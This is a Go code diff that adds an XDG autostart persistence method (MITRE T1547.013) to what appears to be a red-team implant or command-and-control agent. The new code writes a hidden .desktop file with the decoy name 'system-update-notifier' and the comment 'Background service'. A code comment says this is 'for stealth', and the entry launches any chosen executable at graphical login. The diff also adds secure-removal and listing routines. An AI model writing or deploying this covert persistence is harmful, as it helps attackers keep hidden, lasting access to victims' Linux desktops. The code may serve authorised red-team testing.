@@ -230,6 +230,92 @@ func persistSSHKeyRemove(args persistArgs) structs.CommandResult {
 	return successResult(fmt.Sprintf("Removed %d SSH key(s) with marker '%s' from %s", removed, marker, authKeysPath))
 }
 
+// persistXDGAutostart installs/removes XDG autostart desktop entries (T1547.013).
+// Creates .desktop files in ~/.config/autostart/ that execute on graphical login.
+func persistXDGAutostart(args persistArgs) structs.CommandResult {
+	switch args.Action {
+	case "install":
+		return persistXDGAutostartInstall(args)
+	case "remove":
+		return persistXDGAutostartRemove(args)
+	default:
+		return errorf("Unknown action: %s. Use: install, remove", args.Action)
+	}
+}
+
+func persistXDGAutostartInstall(args persistArgs) structs.CommandResult {
+	if args.Path == "" {
+		return errorResult("Error: path (executable to persist) is required")
+	}
+	if args.Name == "" {
+		args.Name = "system-update-notifier"
+	}
+
+	home, _ := os.UserHomeDir()
+	autostartDir := filepath.Join(home, ".config", "autostart")
+	os.MkdirAll(autostartDir, 0755)
+
+	desktopFile := filepath.Join(autostartDir, args.Name+".desktop")
+
+	// Check if it already exists
+	if _, err := os.Stat(desktopFile); err == nil {
+		return errorf("XDG autostart entry already exists: %s. Remove first.", desktopFile)
+	}
+
+	// Generate .desktop file content
+	// Use a benign-looking name and comment for stealth
+	displayName := args.Name
+	if strings.Contains(displayName, "-") {
+		parts := strings.Split(displayName, "-")
+		for i, p := range parts {
+			if len(p) > 0 {
+				parts[i] = strings.ToUpper(p[:1]) + p[1:]
+			}
+		}
+		displayName = strings.Join(parts, " ")
+	}
+
+	content := fmt.Sprintf(`[Desktop Entry]
+Type=Application
+Name=%s
+Exec=%s
+Hidden=false
+NoDisplay=true
+X-GNOME-Autostart-enabled=true
+X-MATE-Autostart-enabled=true
+X-KDE-autostart-after=panel
+Comment=Background service
+`, displayName, args.Path)
+
+	if err := os.WriteFile(desktopFile, []byte(content), 0644); err != nil {
+		return errorf("Failed to write %s: %v", desktopFile, err)
+	}
+
+	return successf("XDG autostart persistence installed:\n  File: %s\n  Name: %s\n  Exec: %s\n  Trigger: Runs at graphical login (GNOME, KDE, XFCE, MATE)\n\nRemove with: persist -method xdg-autostart -action remove -name %s", desktopFile, displayName, args.Path, args.Name)
+}
+
+func persistXDGAutostartRemove(args persistArgs) structs.CommandResult {
+	if args.Name == "" {
+		args.Name = "system-update-notifier"
+	}
+
+	home, _ := os.UserHomeDir()
+	desktopFile := filepath.Join(home, ".config", "autostart", args.Name+".desktop")
+
+	if _, err := os.Stat(desktopFile); err != nil {
+		return errorf("XDG autostart entry not found: %s", desktopFile)
+	}
+
+	// Secure remove
+	secureRemove(desktopFile)
+
+	if _, err := os.Stat(desktopFile); err == nil {
+		return errorf("Failed to remove %s: file still exists", desktopFile)
+	}
+
+	return successf("Removed XDG autostart persistence: %s", desktopFile)
+}
+
 // persistLinuxList lists all installed persistence methods
 func persistLinuxList() structs.CommandResult {
 	var sb strings.Builder
@@ -291,6 +377,22 @@ func persistLinuxList() structs.CommandResult {
 		}
 	}
 	if !found {
+		sb.WriteString("  (none found)\n")
+	}
+
+	// Check XDG autostart
+	sb.WriteString("\n[XDG Autostart]\n")
+	autostartDir := filepath.Join(home, ".config", "autostart")
+	xdgFound := false
+	if entries, err := os.ReadDir(autostartDir); err == nil {
+		for _, e := range entries {
+			if strings.HasSuffix(e.Name(), ".desktop") {
+				sb.WriteString(fmt.Sprintf("  %s\n", e.Name()))
+				xdgFound = true
+			}
+		}
+	}
+	if !xdgFound {
 		sb.WriteString("  (none found)\n")
 	}
 
